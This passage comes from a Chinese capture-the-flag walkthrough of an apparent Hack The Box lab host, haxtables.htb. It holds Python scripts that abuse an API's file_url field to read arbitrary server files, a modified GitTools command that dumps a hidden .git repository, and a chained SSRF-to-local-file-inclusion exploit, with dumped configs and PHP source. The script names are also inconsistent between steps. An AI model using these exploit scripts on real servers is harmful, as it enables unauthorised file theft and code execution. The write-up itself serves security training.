class="line">uuidd:x:108:114::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:109:115::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:111:117::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">svc:x:1000:1000:svc:&#x2F;home&#x2F;svc:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:999:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
<p>编写如下<code>lfi.py</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;file://%s&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = req.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">data = json.loads(res.text)</span><br><span class="line">print(b64decode(data[<span class="string">&quot;data&quot;</span>]).decode())</span><br></pre></td></tr></table></figure>
<p>读取apache2站点配置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lfi.py /etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName haxtables.htb</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName api.haxtables.htb</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;api</span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName image.haxtables.htb</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        </span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;image</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line">    #SecRuleEngine On</span><br><span class="line"></span><br><span class="line">    &lt;LocationMatch &#x2F;&gt;</span><br><span class="line">        SecAction initcol:ip&#x3D;%&#123;REMOTE_ADDR&#125;,pass,nolog,id:&#39;200001&#39;</span><br><span class="line">        SecAction &quot;phase:5,deprecatevar:ip.somepathcounter&#x3D;1&#x2F;1,pass,nolog,id:&#39;200002&#39;&quot;</span><br><span class="line">        SecRule IP:SOMEPATHCOUNTER &quot;@gt 5&quot; &quot;phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:&#39;200003&#39;&quot;</span><br><span class="line">        SecAction &quot;phase:2,pass,setvar:ip.somepathcounter&#x3D;+1,nolog,id:&#39;200004&#39;&quot;</span><br><span class="line">        Header always set Retry-After &quot;10&quot; env&#x3D;RATELIMITED</span><br><span class="line">    &lt;&#x2F;LocationMatch&gt;</span><br><span class="line"></span><br><span class="line">    ErrorDocument 429 &quot;Rate Limit Exceeded&quot;</span><br><span class="line"></span><br><span class="line">        &lt;Directory &#x2F;var&#x2F;www&#x2F;image&gt;</span><br><span class="line">                Deny from all</span><br><span class="line">                Allow from 127.0.0.1</span><br><span class="line">                Options Indexes FollowSymLinks</span><br><span class="line">                AllowOverride All</span><br><span class="line">                Require all granted</span><br><span class="line">        &lt;&#x2F;DIrectory&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax&#x3D;apache ts&#x3D;4 sw&#x3D;4 sts&#x3D;4 sr noet</span><br></pre></td></tr></table></figure>
<p>站点<code>image.haxtables.htb</code>仅允许本地访问</p>
<p>读取<code>image.haxtables.htb/index.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lfi.py /var/www/image/index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/coming_soon.html&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>读取<code>image.haxtables.htb/utils.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/utils.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        http_response_code(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (gethostbyname(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_status</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;z</span><br><span class="line">    <span class="variable">$status</span> = shell_exec(<span class="string">&#x27;cd /var/www/image &amp;&amp; /usr/bin/git status&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$status</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_log</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = shell_exec(<span class="string">&#x27;cd /var/www/image &amp;&amp; /ust/bin/git log --oneline &quot;&#x27;</span> . addslashes(<span class="variable">$file</span>) . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$log</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$commit</span> = shell_exec(<span class="string">&#x27;sudo -u svc /var/www/image/scripts/git-commit.sh&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$commit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>该路径疑似存在git</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/.git/HEAD</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ref: refs&#x2F;heads&#x2F;master</span><br></pre></td></tr></table></figure>
<p>确认存在git</p>
<p>获取<code>GitTools</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/internetwache/GitTools</span><br></pre></td></tr></table></figure>
<p><code>./GitTools/Dumper/gitdumper.sh</code>的curl语句替换为如下语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://api.haxtables.htb/v3/tools/string/index.php&quot;</span> --json <span class="string">&quot;&#123;\&quot;action\&quot;:\&quot;b64encode\&quot;, \&quot;file_url\&quot;:\&quot;file:///var/www/image/.git/<span class="variable">$objname</span>\&quot;&#125;&quot;</span> | jq -r .data  | base64 -d &gt; <span class="string">&quot;<span class="variable">$target</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>获取项目文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash ./Dumper/gitdumper.sh http://images.haxtables.htb/.git/ /tmp/image/</span><br><span class="line">bash ./Extractor/extractor.sh /tmp/image/ /tmp/dump/</span><br></pre></td></tr></table></figure>
<p>得到<code>/action/action_header.php</code>内容</p>
<p>确认内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/actions/action_handler.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;No page specified!&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>存在可以进行LFI漏洞，请求<code>http://image.haxtables.htb/actions/action_handler.php?page=PAYLOAD</code>进行LFI_TO_RCE</p>
<p>确认<code>/etc/hosts</code>信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /etc/hosts</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 encoding</span><br><span class="line">127.0.0.1 haxtables.htb api.haxtables.htb image.haxtables.htb</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>
<p>存在<code>image.haxtables.htb</code>的解析记录</p>
<p>编写<code>exp.py</code>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;http://image.haxtables.htb/actions/action_handler.php?page=%s&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line">res = req.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<p>进行LFI测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py file:///etc/passwd</span><br></pre></td></tr></table></figure>
<p>报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;Unacceptable URL&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>api.haxtables.htb/v3/tools/string/index.php</code>的代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/api/v3/tools/string/index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../../../utils.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$jsondata</span> = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="string">&#x27;file_url&#x27;</span>, <span class="variable">$jsondata</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = get_url_content(<span class="variable">$jsondata</span>[<span class="string">&#x27;file_url&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span>  === <span class="string">&#x27;str2hex&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; str2hex(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>  (<span class="variable">$action</span> === <span class="string">&#x27;hex2str&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span> =&gt; hex2str(<span class="variable">$data</span>) ]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;md5&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; md5(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;sha1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; sha1(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;urlencode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; urlencode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;urldecode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; urldecode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;b64encode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; base64_encode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;b64decode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; base64_decode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span>=&gt; <span class="string">&#x27;Invalid action&#x27;</span>], <span class="number">404</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>查看第一个<code>api.haxtables.htb/handler.php</code>的代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/api/handler.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        http_response_code(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_included_contents</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">return</span> ob_get_clean();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (gethostbyname(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) 